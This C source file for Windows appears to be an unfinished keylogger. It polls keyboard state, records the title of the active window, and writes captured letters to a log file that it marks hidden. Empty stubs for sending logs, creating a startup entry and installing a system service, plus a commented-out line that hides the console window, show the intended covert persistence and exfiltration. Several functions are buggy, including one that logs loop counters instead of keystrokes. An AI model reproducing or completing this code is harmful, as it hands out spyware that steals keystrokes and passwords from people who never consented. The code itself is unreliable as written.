#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define BUFFER_SIZE 5
#define PATH "C:/Log.txt"

struct node {
    char window[256];
    unsigned char * buffer[BUFFER_SIZE];
    
    node * next;
};

node * node_create(char window[], unsigned char buffer[]) {
    node * instance = (node *)malloc(sizeof(node));
    
    memcpy(instance->window, window, 256);
    memcpy(instance->buffer, buffer, BUFFER_SIZE);

    instance->next = NULL;

    return instance;
}

void node_append(node * iterator, char * window, unsigned char buffer[]) {
    while (iterator->next != NULL) {
        iterator = iterator->next;
    }

    iterator->next = node_create(window, buffer);
}

BYTE getKeyState(BYTE key) {
    return (GetAsyncKeyState(key) & 0x8000 != 0);
}

void writeLogs(BYTE buffer[]) {
    FILE *file = fopen(PATH, "a+");
    SetFileAttributes(PATH, FILE_ATTRIBUTE_HIDDEN);

    for (BYTE i = 0; i < BUFFER_SIZE; i++) {
        fprintf(file, "%c", (char) i);
    }
    
    fclose(file);
}

void appendLogs(char *text) {
    FILE *file = fopen(PATH, "a+");
    fprintf(file, "\n[%s]\n", text);
    fclose(file);
}

void sendLogs() {
    FILE *file = fopen(PATH, "r");

    remove(PATH);
}

void createStartupEntry() {
    
}

void createSystemService() {

}

int main() {
    // TODO: Exit if sincap is already running.
    
    unsigned char * isRunning = (unsigned char *)1, buffer[BUFFER_SIZE], bufferIndex = 0;
    char recentWindow[256], currentWindow[256];

    node * root = node_create(currentWindow, buffer);

    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (isRunning) {
        Sleep(10);

        for (BYTE i = 8; i < 223; i++) {
            if (i > 64 && i < 91) {
                if (getKeyState(i)) {
                    
                    GetWindowText(GetForegroundWindow(), currentWindow, sizeof(currentWindow));

                    if (memcmp(recentWindow, currentWindow, sizeof(recentWindow))) {
                        memcpy(recentWindow, currentWindow, sizeof(recentWindow));
                        //printf("\n[%s]\n", recentWindow);
                        //appendLogs(recentWindow);
                    }

                    buffer[bufferIndex] = i;
                    bufferIndex++;

                    if (bufferIndex >= BUFFER_SIZE) {
                        bufferIndex = 0;
                        //writeLogs(buffer);

                        node_append(root, currentWindow, buffer);
                    }

                    //printf("%c", (char) i + 32);

                    break;
                }
            }
        }

        node * iterator = root;

        while (iterator->next != NULL) {
            printf("\n[%s]\n", iterator->window);
            for(int i = 0; i < BUFFER_SIZE; i++) {
                printf("%d ", iterator->buffer[i]);
            }
            iterator = iterator->next;
        }
    }

    return 0;
}